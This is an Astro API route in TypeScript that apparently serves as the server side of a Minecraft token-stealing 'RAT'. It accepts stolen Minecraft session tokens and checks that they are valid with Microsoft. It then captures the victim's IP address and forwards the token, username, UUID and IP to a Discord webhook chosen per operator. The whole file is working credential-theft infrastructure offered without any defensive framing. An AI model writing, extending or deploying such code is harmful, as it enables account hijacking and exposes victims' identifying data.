import type { APIRoute } from "astro";
import isJson from "../../../../libs/checkJson";
import { queryFirstRes } from "../../../../libs/db/actions/query";
import sendWebhook from "../../../../libs/discord/ratWebhook";
import parseWebhook from "../../../../libs/discord/utils/parseRatWebhook";
import getSessionInfo from "../../../../libs/microsoft/getSessionInfo";

export const post: APIRoute = async ({ request }) => {
  try {
  const resText = await request.text();
  if (!await (isJson(resText))) {
      return await res(400, "Invalid Body");
  }
  const body = await JSON.parse(resText);
  if (!body) {
      return await res(400, "Invalid Body");
  }
  console.log(body);
  for (const key of ["minecraft", "userid"]) {
      if (!body.hasOwnProperty(key)) {
        return await res(400, "Body Missing " + key);
      }
  }
  if (!body.minecraft.hasOwnProperty("token")) {
      return await res(400, "Body Missing minecraft.token");
  }
  const rows = await queryFirstRes("SELECT webhook FROM users WHERE user_id = ?", [body.userid]);
  if (!rows) {
      return await res(400, "Invalid User ID");
  }
  const webhook = rows.webhook;
  console.log(rows);
  const { status, username, uuid } = await getSessionInfo(body.minecraft.token);
  if (status !== 200) {
      return await res(status, "Invalid Minecraft Token");
  }
  const ip = request.headers.get("CF-Connecting-IP") || "Unknown";
  const webhookBody:any = await parseWebhook(username, uuid, body.minecraft.token, ip, body);
  sendWebhook(webhookBody, webhook);
  return await res(200, "Success");
  } catch (e) {
    console.log(e);
    return await res(500, "Internal Server Error");
  }
}

async function res(status:number, message:string) {
  return new Response(JSON.stringify({
      message: message,
      status: status
  }), {
      status: status,
      headers: {
          "Content-Type": "application/json"
      }
  })
}